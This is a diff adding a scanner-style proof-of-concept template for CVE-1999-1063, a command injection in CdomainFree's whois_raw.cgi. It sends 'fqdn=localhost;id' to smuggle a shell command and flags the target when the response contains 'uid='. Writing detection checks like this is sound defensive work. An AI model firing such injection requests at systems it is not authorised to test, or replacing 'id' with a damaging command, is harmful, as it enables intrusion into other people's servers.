@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 CdomainFree 2.4 whois_raw.cgi 脚本中的命令注入漏洞，通过向 fqdn 参数注入 shell 元字符可执行任意命令"
+id = "POC-AVE-1999-1688"
+name = "CVE-1999-1063 PoC"
+severity = "critical"
+tags = ["ave-1999-1688"]
+vuln_id = [
+    "CVE-1999-1063",
+    "AVE-1999-1688",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/whois_raw.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "fqdn=localhost;id"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
